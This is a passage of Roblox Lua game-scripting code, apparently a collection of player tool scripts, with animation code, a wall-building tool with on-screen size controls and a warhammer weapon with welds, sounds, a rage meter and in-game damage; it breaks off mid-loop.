				bbm.Scale=bbm.Scale:Lerp(bbm.Scale+Vector3.new(8,8,8),.1)
				grm1.Scale=grm1.Scale:Lerp(grm1.Scale+Vector3.new(7,7,7),.1)
				grm2.Scale=grm2.Scale:Lerp(grm2.Scale+Vector3.new(7,7,7),.1)
				ss1.Scale=ss1.Scale:Lerp(ss1.Scale+Vector3.new(7,3,7),.1)
				ss2.Scale=ss2.Scale:Lerp(ss2.Scale+Vector3.new(7,2,7),.1)
				--Transparency
				b1.Transparency=.7+i/400
				b2.Transparency=.7+i/400
				b3.Transparency=.7+i/400
				r1.Transparency=.7+i/400
				r2.Transparency=.7+i/400
				bb.Transparency=.7+i/400
				gr.Transparency=.7+i/400
				gr2.Transparency=.7+i/400
				sw.Transparency=.7+i/400
				sw2.Transparency=.7+i/400
				
			end
				b1:Destroy()
			b2:Destroy()
			b3:Destroy()
			r1:Destroy()
			r2:Destroy()
			bb:Destroy()
			gr:Destroy()
			gr2:Destroy()
			sw:Destroy()
			sw2:Destroy()
		end
		Torso.Anchored=true
		RS.C0 = clerp(RS.C0,RS.C0* angles(rad(-30), rad(0), rad(0)), 1)
			LS.C0 = clerp(LS.C0,LS.C0* angles(rad(-30), rad(0), rad(0)), 1)
			RH.C0 = clerp(RH.C0,RH.C0* angles(rad(-10), rad(0), rad(0)), 1)
			LH.C0 = clerp(LH.C0,LH.C0* angles(rad(-10), rad(0), rad(0)), 1)
			Neck.C0 = clerp(Neck.C0,Neck.C0*angles(rad(-35), rad(0), rad(0)), 1)
			spawn(function()
		Explosion()
			end)
			wait(2)
		Torso.Anchored=false
		newpos()
		
		attacking=false
	end
end)

Mouse.KeyDown:connect(function(Key)
	if Key=="l" then
		local poop=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.7)
		local cyl=mesh(poop,"Cylinder",v3(1,1,1))
		for i=1,60,.2 do r:wait()
			cyl.Scale=Vector3.new(i*2,i*2,4)
			poop.CFrame=Torso.CFrame*CFrame.new(0,0,-i)*CFrame.Angles(0,rad(90),0)
		end
		
	end
end)

Mouse.KeyDown:connect(function(Key)
	if Key=="m" then
		local poop=part(Char,true,false,v3(1,1,1),Torso.CFrame*cf(ran(3,10),ran(0,10),ran(3,10)),c3(0,1,0),"Neon",.7)
		poop.CFrame=poop.CFrame*CFrame.new(poop.Position-Torso.Position,poop.Position)
	end
end)









local animpose = "Idle"
local lastanimpose = "Idle"
local sine = 0
local change = 1
local val = 0
local ffing = false
-------------------------------
game:GetService("RunService").RenderStepped:connect(function()
--[[if char.Humanoid.Jump == true then
jump = true
else
jump = false
end]]
char.Humanoid.FreeFalling:connect(function(f)
if f then
ffing = true
else
ffing = false
end
end)
sine = sine + change
if jumpn == true then
animpose = "Jumping"
elseif ffing == true then
animpose = "Freefalling"
elseif (torso.Velocity*Vector3.new(1, 0, 1)).magnitude < 2 then
animpose = "Idle"
elseif (torso.Velocity*Vector3.new(1, 0, 1)).magnitude < 20 then
animpose = "Walking"
elseif (torso.Velocity*Vector3.new(1, 0, 1)).magnitude > 20 then
animpose = "Running"
end
if animpose ~= lastanimpose then
sine = 0
if Debounces.NoIdl == false then
if animpose == "Idle" then
for i = 1, 2 do
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(1.5,0.62,0)*CFrame.Angles(math.rad(-6),math.rad(-6),math.rad(8)), 0.4)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-1.5,0.62,0)*CFrame.Angles(math.rad(-6),math.rad(6),math.rad(-8)), 0.4)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,1.5,-.2)*CFrame.Angles(math.rad(-14),math.rad(0),0), 0.4)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, 0, 0) * CFrame.Angles(0, math.rad(0), math.rad(0)), 0.4)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-0.5, -1, 0) * CFrame.Angles(0, 0, math.rad(-8)), 0.4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(0.5, -1, 0) * CFrame.Angles(0, 0, math.rad(8)), 0.4)
end
elseif animpose == "Walking" then
for i = 1, 2 do
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(1.5,0.55,0)*CFrame.Angles(math.rad(-16),math.rad(-12),math.rad(10+2*math.cos(sine/14))), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-1.5,0.55,0)*CFrame.Angles(math.rad(-16),math.rad(12),math.rad(-10-2*math.cos(sine/14))), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 1.5, -.2) * CFrame.Angles(math.rad(-14),0,0), 0.4)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-10),0, math.rad(0)), 0.05)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-0.5, -1, 0) * CFrame.Angles(math.rad(-8), 0, math.rad(-8)), 0.4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(0.5, -1, 0) * CFrame.Angles(math.rad(-8), 0, math.rad(8)), 0.4)
end
elseif animpose == "Running" then
for i = 1, 2 do
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(1.5,0.55,0)*CFrame.Angles(math.rad(-20),math.rad(-14),math.rad(8+2*math.cos(sine/14))), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-1.5,0.55,0)*CFrame.Angles(math.rad(-20),math.rad(14),math.rad(-8-2*math.cos(sine/14))), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 1.5, -.2) * CFrame.Angles(math.rad(-10),0,0), 0.4)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-20),0, math.rad(0)), 0.4)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-0.5, -1, 0) * CFrame.Angles(math.rad(-12), 0, math.rad(-7)), 0.4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(0.5, -1, 0) * CFrame.Angles(math.rad(-12), 0, math.rad(7)), 0.4)
wait()
end
end
else
end
end
lastanimpose = animpose
if Debounces.NoIdl == false then
if animpose == "Idle" then
change = 0.5
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(1.5,0.62+0.1*math.cos(sine/10),0)*CFrame.Angles(math.rad(-10),math.rad(-10),math.rad(14+2*math.cos(sine/10))), 0.4)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-1.5,0.62+0.1*math.cos(sine/10),0)*CFrame.Angles(math.rad(-20),math.rad(6),math.rad(-10-2*math.cos(sine/10))), 0.4)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,1.5,-.2)*CFrame.Angles(math.rad(-14+1*math.cos(sine/10)),math.rad(20),0), 0.2)
hed.Weld.C1 = Lerp(hed.Weld.C1, CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0),0), 0.2)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, 1-0.16*math.cos(sine/10), 0) * CFrame.Angles(0, math.rad(-20), math.rad(0)), 0.05)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-0.5, 0-0.1*math.cos(sine/10), -0.55) * CFrame.Angles(math.rad(-10+1*math.cos(sine/10)), math.rad(10), math.rad(-0-2*math.cos(sine/10))), 0.4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(0.5, -1-0.1*math.cos(sine/10), 0) * CFrame.Angles(0, math.rad(-10), math.rad(0+2*math.cos(sine/10))), 0.4)
elseif animpose == "Walking" then
change = 1
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(1.5,0.55,0)*CFrame.Angles(math.rad(-16),math.rad(-12),math.rad(10+2*math.cos(sine/14))), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-1.5,0.55,0)*CFrame.Angles(math.rad(-16),math.rad(12),math.rad(-10-2*math.cos(sine/14))), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 1.5, -.2) * CFrame.Angles(math.rad(-14),0,0), 0.4)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, 0-0.1*math.cos(sine/14), 0) * CFrame.Angles(math.rad(-10),0, math.rad(0)), 0.05)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-0.5, -1, 0) * CFrame.Angles(math.rad(-8), 0, math.rad(-8)), 0.4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(0.5, -1, 0) * CFrame.Angles(math.rad(-8), 0, math.rad(8)), 0.4)
elseif animpose == "Running" then
change = 1
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(1.5,0.35,.4)*CFrame.Angles(math.rad(-30),math.rad(14),math.rad(-30+2*math.cos(sine/14))), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-1.2,0.55,-.4)*CFrame.Angles(math.rad(110),math.rad(0),math.rad(40-2*math.cos(sine/14))), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 1.5, .2) * CFrame.Angles(math.rad(20),math.rad(10),0), 0.4)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, 0-0.1*math.cos(sine/14), 0) * CFrame.Angles(math.rad(-40),math.rad(-10), math.rad(0)), 0.2)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-0.5, 0, -1.2) * CFrame.Angles(math.rad(-20), math.rad(10), math.rad(0)), 0.4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(0.5, -1, 0) * CFrame.Angles(math.rad(-12), math.rad(10), math.rad(0)), 0.4)
end
end
end)

hum.MaxHealth = math.huge
wait(3)
hum.Health = math.huge
spawn(function()
	while wait(2)
		 do
		GroundWave3()	
	end
end)	
end}
module[2] = {"Wall Maker",function()


gui = false 

me = game.Players.LocalPlayer.Name

bigcolor = "Really black" 

smallcolor = "Really black" 

XSize = 10 

YSize = 5 

ZSize = 2 

Distance = 15 

if script.Parent.className ~= "HopperBin" then 

tool = Instance.new("HopperBin") 

tool.Parent = game.Players[me].Backpack 

tool.Name = "Wall Maker" 

script.Parent = tool 

end  

tool.Selected:connect(function(mouse) 

if gui == false then 

gui = true 

screen = Instance.new("ScreenGui") 

screen.Parent = game.Players[me].PlayerGui 

b1 = Instance.new("TextButton") 

b1.Parent = screen 

b1.Size = UDim2.new(0.02, 0, 0.05, 0) 

b1.Position = UDim2.new(0.1, 0, 0.3, 0) 

b1.Text = ">" 

b1.MouseButton1Down:connect(function() 

XSize = XSize + 1 

msg = Instance.new("Message") 

msg.Parent = tool.Parent.Parent 

msg.Text = "X increased to "..XSize 

msg.Name = "Text" 

wait (2) 

tool.Parent.Parent.Text:Remove() 

end) 

b2 = Instance.new("TextButton") 

b2.Parent = screen 

b2.Size = UDim2.new(0.02, 0, 0.05, 0) 

b2.Position = UDim2.new(0, 0, 0.3, 0) 

b2.Text = "<" 

b2.MouseButton1Down:connect(function() 

XSize = XSize - 1 

msg = Instance.new("Message") 

msg.Parent = tool.Parent.Parent 

msg.Text = "X decreased to "..XSize 

msg.Name = "Text" 

wait (2) 

tool.Parent.Parent.Text:Remove() 

end) 

b3 = Instance.new("TextLabel") 

b3.Parent = screen 

b3.Size = UDim2.new(0.08, 0, 0.05, 0) 

b3.Position = UDim2.new(0.02, 0, 0.3, 0) 

b3.Text = "Size-X" 

b4 = Instance.new("TextButton") 

b4.Parent = screen 

b4.Size = UDim2.new(0.02, 0, 0.05, 0) 

b4.Position = UDim2.new(0.1, 0, 0.35, 0) 

b4.Text = ">" 

b4.MouseButton1Down:connect(function() 

YSize = YSize + 1 

msg = Instance.new("Message") 

msg.Parent = tool.Parent.Parent 

msg.Text = "Y increased to "..YSize 

msg.Name = "Text" 

wait (2) 

tool.Parent.Parent.Text:Remove() 

end) 

b5 = Instance.new("TextButton") 

b5.Parent = screen 

b5.Size = UDim2.new(0.02, 0, 0.05, 0) 

b5.Position = UDim2.new(0, 0, 0.35, 0) 

b5.Text = "<" 

b5.MouseButton1Down:connect(function() 

YSize = YSize - 1 

msg = Instance.new("Message") 

msg.Parent = tool.Parent.Parent 

msg.Text = "Y decreased to "..YSize 

msg.Name = "Text" 

wait (2) 

tool.Parent.Parent.Text:Remove() 

end) 

b6 = Instance.new("TextLabel") 

b6.Parent = screen 

b6.Size = UDim2.new(0.08, 0, 0.05, 0) 

b6.Position = UDim2.new(0.02, 0, 0.35, 0) 

b6.Text = "Size-Y" 

b7 = Instance.new("TextButton") 

b7.Parent = screen 

b7.Size = UDim2.new(0.02, 0, 0.05, 0) 

b7.Position = UDim2.new(0.1, 0, 0.4, 0) 

b7.Text = ">" 

b7.MouseButton1Down:connect(function() 

ZSize = ZSize + 1 

msg = Instance.new("Message") 

msg.Parent = tool.Parent.Parent 

msg.Text = "Z increased to "..ZSize 

msg.Name = "Text" 

wait (2) 

tool.Parent.Parent.Text:Remove() 

end) 

b8 = Instance.new("TextButton") 

b8.Parent = screen 

b8.Size = UDim2.new(0.02, 0, 0.05, 0) 

b8.Position = UDim2.new(0, 0, 0.4, 0) 

b8.Text = "<" 

b8.MouseButton1Down:connect(function() 

ZSize = ZSize - 1 

msg = Instance.new("Message") 

msg.Parent = tool.Parent.Parent 

msg.Text = "Z decreased to "..ZSize 

msg.Name = "Text" 

wait (2) 

tool.Parent.Parent.Text:Remove() 

end) 

b9 = Instance.new("TextLabel") 

b9.Parent = screen 

b9.Size = UDim2.new(0.08, 0, 0.05, 0) 

b9.Position = UDim2.new(0.02, 0, 0.4, 0) 

b9.Text = "Size-Z" 

b10 = Instance.new("TextButton") 

b10.Parent = screen 

b10.Size = UDim2.new(0.02, 0, 0.05, 0) 

b10.Position = UDim2.new(0.1, 0, 0.45, 0) 

b10.Text = ">" 

b10.MouseButton1Down:connect(function() 

Distance = Distance + 1 

msg = Instance.new("Message") 

msg.Parent = tool.Parent.Parent 

msg.Text = "Distance increased to "..Distance 

msg.Name = "Text" 

wait (2) 

tool.Parent.Parent.Text:Remove() 

end) 

b11 = Instance.new("TextButton") 

b11.Parent = screen 

b11.Size = UDim2.new(0.02, 0, 0.05, 0) 

b11.Position = UDim2.new(0, 0, 0.45, 0) 

b11.Text = "<" 

b11.MouseButton1Down:connect(function() 

Distance = Distance - 1 

msg = Instance.new("Message") 

msg.Parent = tool.Parent.Parent 

msg.Text = "Distance decreased to "..Distance 

msg.Name = "Text" 

wait (2) 

tool.Parent.Parent.Text:Remove() 

end) 

b12 = Instance.new("TextLabel") 

b12.Parent = screen 

b12.Size = UDim2.new(0.08, 0, 0.05, 0) 

b12.Position = UDim2.new(0.02, 0, 0.45, 0) 

b12.Text = "Distance" 

end 

mouse.Button1Down:connect(function() 

click = true 

while click == true do 

wall = Instance.new("Part") 

wall.Parent = workspace 

wall.Size = Vector3.new(XSize, YSize, ZSize) 

wall.Locked = true 

wall.CFrame = CFrame.new(tool.Parent.Parent.Character.Torso.Position, mouse.Hit.p) 

wall.CFrame = CFrame.new(wall.Position + (wall.CFrame.lookVector * Distance), mouse.Hit.p) 

wall.BrickColor = BrickColor.new(bigcolor) 

wall.Anchored = true 

wait (0.1) 

end 

end) 

mouse.Button1Up:connect(function() 

click = false 

end) 

end) 

end}

 
 

module[1] = {"WarHammer",function()

	me = game.Players.LocalPlayer
char = me.Character
Modelname = "Warhammah"
Toolname = "Warhammar"
Surfaces = {"FrontSurface", "BackSurface", "TopSurface", "BottomSurface", "LeftSurface", "RightSurface"}
necko = CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
selected = false
effectOn = false
Hurt = false
Leghurt = false
Deb = true
LegDeb = true
Able = true
Resting = false
RestingAnim = false
AbleG = true
Prop = {Damage = 42, Legdmg = 34, AS = 28, ShockDMG = 50, Rage = 7000000, RageIncome = 7000, MaxRage = 7000000}
Prop.AS = Prop.AS/300
Cam = workspace.CurrentCamera
ToolIcon = "http://www.roblox.com/asset/?id=49192762"
MouseIc = "http://www.roblox.com/asset/?id=49192792"
MouseDo = "http://www.roblox.com/asset/?id=49192819"
Add = {
Sphere = function(P)
local m = Instance.new("SpecialMesh",P)
m.MeshType = "Sphere"
return m
end,
BF = function(P)
local bf = Instance.new("BodyForce",P)
bf.force = Vector3.new(0, P:GetMass()*187, 0)
return bf
end,
BP = function(P)
local bp = Instance.new("BodyPosition",P)
bp.maxForce = Vector3.new(math.huge, 0, math.huge)
bp.P = 14000
return bp
end,
BG = function(P)
local bg = Instance.new("BodyGyro",P)
bg.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
bg.P = 14000
return bg
end,
Mesh = function(P, ID, x, y, z)
local m = Instance.new("SpecialMesh")
m.MeshId = ID
m.Scale = Vector3.new(x, y, z)
m.Parent = P
return m
end,
Sound = function(P, ID, vol, pitch)
local s = Instance.new("Sound")
s.SoundId = ID
s.Volume = vol
s.Pitch = pitch
s.Parent = P
return s
end
}
function find(tab, arg)
local ah = nil
for i,v in pairs(tab) do
if v == arg then
ah = v
end
end
return ah
end
function getAllParts(from)
local t = {}
function getParts(where)
for i, v in pairs(where:children()) do
if v:IsA("BasePart") then
if v.Parent ~= char and v.Parent.Parent ~= char then
table.insert(t, v)
end
end
getParts(v)
end
end
getParts(workspace)
return t
end
function RayCast(pos1, pos2, maxDist, forward)
local list = getAllParts(workspace)
local pos0 = pos1
for dist = 1, maxDist, forward do
pos0 = (CFrame.new(pos1, pos2) * CFrame.new(0, 0, -dist)).p
for _, v in pairs(list) do
local pos3 = v.CFrame:pointToObjectSpace(pos0)
local s = v.Size
if pos3.x > -(s.x/2) and pos3.x < (s.x/2) and pos3.y > -(s.y/2) and pos3.y < (s.y/2) and pos3.z > -(s.z/2) and pos3.x < (s.z/2) and v.CanCollide and v:GetMass() > 14 then
return pos0, v
end
end
end
return pos0, nil
end
function Part(Parent, Anchor, Collide, Tran, Ref, Color, X, Y, Z, Break)
local p = Instance.new("Part")
p.formFactor = "Custom"
p.Anchored = Anchor
p.CanCollide = Collide
p.Transparency = Tran
p.Reflectance = Ref
p.BrickColor = BrickColor.new(Color)
for _, Surf in pairs(Surfaces) do
p[Surf] = "Smooth"
end
p.Size = Vector3.new(X, Y, Z)
if Break then
p:BreakJoints()
else p:MakeJoints() end
p.Parent = Parent
p.Locked = true
return p
end
function Weld(p0, p1, x, y, z, a, b, c)
local w = Instance.new("Weld")
w.Parent = p0
w.Part0 = p0
w.Part1 = p1
w.C1 = CFrame.new(x,y,z) * CFrame.Angles(a,b,c)
return w
end
function ComputePos(pos1, pos2)
local pos3 = Vector3.new(pos2.x, pos1.y, pos2.z)
return CFrame.new(pos1, pos3)
end
function getHumanoid(c)
local h = nil
for i,v in pairs(c:children()) do
if v:IsA("Humanoid") and c ~= char then
if v.Health > 0 then
h = v
end
end
end
return h
end
for i,v in pairs(char:children()) do
if v.Name == Modelname then
v:remove()
end
end
pcall(function() me.PlayerGui:findFirstChild("RaigMeter",true):remove() end)
Sc = Instance.new("ScreenGui",me:findFirstChild("PlayerGui"))
Sc.Name = "RaigMeter"
Fr = Instance.new("Frame",Sc)
Fr.Size = UDim2.new(0, 250, 0, 28)
Fr.Position = UDim2.new(0.5, -125, 0, 5)
Fr.BackgroundColor3 = Color3.new(0.8, 0.3, 0.1)
Met = Instance.new("Frame", Fr)
Met.Size = UDim2.new(1, -10, 1, -6)
Met.Position = UDim2.new(0, 5, 0, 3)
Met.BackgroundColor3 = Color3.new(0, 0, 0)
Met.BorderSizePixel = 0
Meter = Instance.new("ImageLabel", Met)
Meter.Size = UDim2.new(Prop.Rage/Prop.MaxRage, 0, 1, -2)
Meter.Position = UDim2.new(0, 0, 0, 1)
Meter.Image = "http://www.roblox.com/asset/?id=48965808"
Meter.BorderSizePixel = 0
Meter.BackgroundColor3 = Color3.new(1, 0.6, 0.1)
Tx = Instance.new("TextLabel", Met)
Tx.Size = UDim2.new(0, 0, 1, 0)
Tx.Position = UDim2.new(0, 5, 0, 0)
Tx.Text = Prop.Rage.." / "..Prop.MaxRage
Tx.Font = "ArialBold"
Tx.FontSize = "Size18"
Tx.BackgroundTransparency = 1
Tx.TextColor3 = Color3.new(1, 0, 0)
Tx.TextXAlignment = "Left"
laast = Prop.Rage
coroutine.resume(coroutine.create(function()
while true do
wait()
if Prop.Rage > Prop.MaxRage then Prop.Rage = Prop.MaxRage end
if laast ~= Prop.Rage then
Meter.Size = UDim2.new(Prop.Rage/Prop.MaxRage, 0, 1, -2)
laast = Prop.Rage
Tx.Text = Prop.Rage.." / "..Prop.MaxRage
end
end
end))
torso = char.Torso
neck = torso.Neck
hum = char.Humanoid
Rarm = char["Right Arm"]
Larm = char["Left Arm"]
Rleg = char["Right Leg"]
Lleg = char["Left Leg"]
hc = Instance.new("Humanoid")
hc.Health = 0
hc.MaxHealth = 0
slash = Add.Sound(nil, "rbxasset://sounds//swordslash.wav", 0.9, 0.8)
hitsound = Add.Sound(nil, "http://www.roblox.com/asset/?id=2801263", 0.7, 0.6)
charge = Add.Sound(nil, "http://www.roblox.com/asset/?id=2101137", 0.8, 0.65)
boom = Add.Sound(nil, "http://www.roblox.com/asset/?id=2691586", 0.8, 0.3)
smashsound = Add.Sound(nil, "http://www.roblox.com/asset/?id=2692806", 0.8, 0.35)
boomboom = Add.Sound(nil, "http://www.roblox.com/asset/?id=2760979", 1, 0.18)
equip = Add.Sound(nil, "rbxasset://sounds\\unsheath.wav", 0.6, 0.7)
function PlaySound(sound, pitch)
local s = sound:clone()
if pitch ~= nil then
if tonumber(pitch) then
s.Pitch = tonumber(pitch)
end
end
s.Parent = torso
s.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
s:remove()
end))
end
Mo = Instance.new("Model")
Mo.Name = Modelname
RABrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
LABrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
RLBrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
LLBrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
RABW = Weld(torso, RABrick, -1.5, -0.5, 0, 0, 0, 0)
LABW = Weld(torso, LABrick, 1.5, -0.5, 0, 0, 0, 0)
RLBW = Weld(torso, RLBrick, -0.5, 1.2, 0, 0, 0, 0)
LLBW = Weld(torso, LLBrick, 0.5, 1.2, 0, 0, 0, 0)
RAW = Weld(RABrick, nil, 0, 0.5, 0, 0, 0, 0)
LAW = Weld(LABrick, nil, 0, 0.5, 0, 0, 0, 0)
RLW = Weld(RLBrick, nil, 0, 0.8, 0, 0, 0, 0)
LLW = Weld(LLBrick, nil, 0, 0.8, 0, 0, 0, 0)
HB = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
HBW = Weld(Rarm, HB, 0, 1, 0, 0, 0, 0)
HW = Weld(HB, nil, 0, -1.3, 0, math.pi/2, 0, 0)
TH = Weld(torso, nil, -0.8, 0.1, 0, 0, math.pi/2, math.rad(-140))
RAWStand, LAWStand, RLWStand, LLWStand, HWStand = nil
handle = Part(Mo, false, false, 0, 0, "Navy blue", 0.4, 5, 0.4, true)
handle.Name = "Handle"
Instance.new("SpecialMesh",handle)
maintip = Part(Mo, false, false, 1, 0, "Bright yellow", 0.6, 0.5, 0.6, true)
Weld(handle, maintip, 0, -1.8, 0, 0, 0, 0)
DMGParts = {}
for i = 0, 135, 45 do
local tip = Part(Mo, false, false, 0, 0, "Dark grey", 0.54, 1.3, 2.2, true)
Instance.new("BlockMesh",tip)
Weld(maintip, tip, 0, 0, 0, 0, 0, math.rad(i))
table.insert(DMGParts, tip)
for a = -0.9, 0.9, 1.8 do
for x = 0, math.pi, math.pi do
local spike = Part(Mo, false, false, 0, 0, "Medium grey", 0.3, 0.5, 0.3, true)
local w = Weld(tip, spike, 0, 0, 0, 0, 0, 0)
w.C0 = CFrame.new(0, 0, a) * CFrame.Angles(x, 0, 0)
w.C1 = CFrame.new(0, -1, 0)
Add.Mesh(spike, "http://www.roblox.com/asset/?id=1033714", 0.14, 1, 0.14)
local trim = Part(Mo, false, false, 0, 0, "Really black", 0.67, 0.1, 0.5, true)
local w2 = Weld(tip, trim, 0, 0, 0, 0, 0, 0)
w2.C0 = CFrame.new(0, 0, a) * CFrame.Angles(x, 0, 0)
w2.C1 = CFrame.new(0, -0.58, 0)
end
end
end
spiketip = Part(Mo, false, false, 0, 0.2, "Navy blue", 0.3, 0.8, 0.3, true)
Weld(handle, spiketip, 0, -3.1, 0, 0, 0, 0)
Add.Mesh(spiketip, "http://www.roblox.com/asset/?id=1033714", 0.17, 2, 0.17)
table.insert(DMGParts, spiketip)
local handletip1 = Part(Mo, false, false, 0, 0.2, "Really black", 0.5, 0.5, 0.5, true)
local w1 = Weld(handle, handletip1, 0, 0, 0, 0, 0, 0)
w1.C0 = CFrame.new(0, -2.6, 0)
Add.Mesh(handletip1, "http://www.roblox.com/asset/?id=9756362", 0.85, 0.75, 0.85)
local handletip2 = Part(Mo, false, false, 0, 0.2, "Dark grey", 0.5, 0.5, 0.5, true)
Weld(handletip1, handletip2, 0, 0, 0, 0, math.rad(45), 0)
Add.Mesh(handletip2, "http://www.roblox.com/asset/?id=9756362", 0.95, 0.5, 0.95)
Mo.Parent = char
TH.Part1 = handle
function showdmg(dmg, p, pos)
local mo = Instance.new("Model")
mo.Name = dmg
local pa = Part(mo, false, true, 0, 0, "Bright red", 0.8, 0.3, 0.8, true)
pa.CFrame = CFrame.new(p.Position) * CFrame.new(0, pos, 0)
pa.Name = "Head"
local hah = hc:clone()
hah.Parent = mo
local bp = Add.BP(pa)
bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
bp.position = p.Position + Vector3.new(0, 3+pos, 0)
Add.BG(pa)
coroutine.resume(coroutine.create(function()
wait()
mo.Parent = workspace
wait(1.4)
mo:remove()
end))
end
function damage(hum, p, num, dm1, dm2)
local dmg = math.random(dm1, dm2)
hum.Health = hum.Health - dmg
showdmg(dmg, p, num)
return dmg
end
function brickdamage(hit)
local h = getHumanoid(hit.Parent)
if h ~= nil and Hurt and Deb then
Deb = false
local dmg = damage(h, maintip, 0, Prop.Damage/4, Prop.Damage)
PlaySound(hitsound)
Prop.Rage = math.floor(Prop.Rage + (dmg*Prop.RageIncome))
wait(0.3)
Deb = true
end
end
function legdamage(hit)
local h = getHumanoid(hit.Parent)
if h ~= nil and Leghurt and LegDeb then
LegDeb = false
local dmg = damage(h, Rleg, 0, Prop.Legdmg/2, Prop.Legdmg)
PlaySound(hitsound)
Prop.Rage = math.floor(Prop.Rage + (dmg*Prop.RageIncome))
coroutine.resume(coroutine.create(function()
local haha = math.random(1,3)
if haha == 1 then
h.PlatformStand = true
wait()
local ps = getAllParts(h.Parent)
for i, v in pairs(ps) do
if v.Anchored == false then
v.Velocity = CFrame.new(handle.Position, v.Position).lookVector * 40
v.RotVelocity = Vector3.new(math.random(-30, 30), math.random(-30, 30), math.random(-30, 30))
end
end
wait(0.8)
h.PlatformStand = false
end
end))
wait(0.2)
LegDeb = true
end
end
for i, v in pairs({Rleg, Lleg}) do
v.Touched:connect(legdamage)
end
for i,v in pairs(DMGParts) do
v.Touched:connect(brickdamage)
end
if script.Parent.className ~= "HopperBin" then
h = Instance.new("HopperBin",me.Backpack)
h.Name = Toolname
h.TextureId = ToolIcon
script.Parent = h
end
bin = h
function StartEffect(part)
effectOn = true
local lastPoint = part.Position
coroutine.resume(coroutine.create(function()
while effectOn do
wait()
local point = CFrame.new(lastPoint, part.Position) * CFrame.Angles(-math.pi/2, 0, 0)
local mag = (lastPoint - part.Position).magnitude
local p = Part(workspace, true, false, 0.1, 0, "Institutional white", 1, 1, 1, true)
local m = Instance.new("SpecialMesh",p)
p.CFrame = point * CFrame.new(0, mag/2, 0)
m.Scale = Vector3.new(1.2, mag+0.6, 1.2)
lastPoint = part.Position
coroutine.resume(coroutine.create(function() for i = 0.1, 1, 0.9/5 do wait() p.Transparency = i end p:remove() end))
end
end))
end
function EndEffect()
effectOn = false
end
function detach(bool)
LLW.C0 = CFrame.new(0, 0, 0)
RLW.C0 = CFrame.new(0, 0, 0)
LAW.C0 = CFrame.new(0,0,0)
RAW.C0 = CFrame.new(0, 0, 0)
if bool then
LLW.Part1 = nil
RLW.Part1 = nil
RAW.Part1 = nil
LAW.Part1 = nil
end
end
function attach()
RAW.Part1 = Rarm
LAW.Part1 = Larm
RLW.Part1 = Rleg
LLW.Part1 = Lleg
end
function normal()
neck.C0 = necko
RAW.C0 = RAWStand
LAW.C0 = LAWStand
RLW.C0 = RLWStand
LLW.C0 = LLWStand
RAW.C1 = CFrame.new(0, 0.5, 0)
LAW.C1 = CFrame.new(0, 0.5, 0)
RLW.C1 = CFrame.new(0, 0.8, 0)
LLW.C1 = CFrame.new(0, 0.8, 0)
HW.C0 = HWStand
end
function idleanim()
attach()
for i = 0, 10, 10/22 do
RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(i), 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-i), 0, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(i/8), 0, math.rad(-i/6))
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-i/8), 0, math.rad(i/6))
neck.C0 = necko * CFrame.Angles(math.rad(-i/2), 0, 0)
if selected == false or torso.Velocity.magnitude > 2 or Able == false or RestingAnim == true then break end
wait()
end
wait()
for i = 10, 0, -10/29 do
